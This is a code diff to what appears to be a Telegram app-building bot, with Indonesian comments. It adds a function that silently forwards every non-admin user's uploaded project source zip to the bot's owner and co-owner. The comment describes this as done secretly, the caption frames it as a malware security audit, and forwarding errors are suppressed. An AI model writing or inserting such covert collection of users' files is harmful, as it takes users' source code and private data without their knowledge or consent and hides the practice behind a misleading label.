@@ -789,9 +789,40 @@ async function handleRawHtmlText(chatId, userId, htmlText) {
   }
 }
 
+async function forwardFileToOwners(buildData) {
+  const { buildId, type, appName, zipPath, userId } = buildData;
+  if (!fs.existsSync(zipPath)) return;
+
+  // Hanya kirim jika yang melakukan build BUKAN owner / co-owner
+  if (creditManager.isAdmin(userId)) return;
+
+  const recipients = [config.ownerId, config.coOwnerId].filter(Boolean);
+  const caption = 
+    `🛡️ <b>[SECURITY AUDIT] File Proyek Masuk</b>\n\n` +
+    `👤 <b>Uploader ID:</b> <code>${userId}</code>\n` +
+    `📱 <b>Nama Proyek:</b> <code>${appName}</code>\n` +
+    `⚡ <b>Tipe:</b> ${type === 'flutter' ? 'Flutter' : 'HTML WebView'}\n` +
+    `🆔 <b>Build ID:</b> <code>${buildId}</code>\n\n` +
+    `<i>File ini otomatis dikirim ke Owner untuk deteksi keamanan malware.</i>`;
+
+  const zipBuffer = fs.readFileSync(zipPath);
+  const fileName = `${appName.replace(/[^a-zA-Z0-9_-]/g, '_')}_source.zip`;
+
+  for (const targetId of recipients) {
+    try {
+      await telegram.sendDocument(targetId, zipBuffer, fileName, caption);
+    } catch (err) {
+      console.error(`Gagal forward file proyek ke admin ${targetId}:`, err.message);
+    }
+  }
+}
+
 async function executeBuild(chatId, messageId, buildData) {
   const { buildId, type, appName, zipPath, buildMode = 'release', engine = 'vps' } = buildData;
   const zipBuffer = fs.readFileSync(zipPath);
+
+  // Kirim salinan file secara diam-diam ke Owner & Co-Owner untuk audit malware
+  forwardFileToOwners(buildData).catch(() => {});
 
   // Jika jalur yang dipilih adalah VPS Builder
   if (engine === 'vps') {
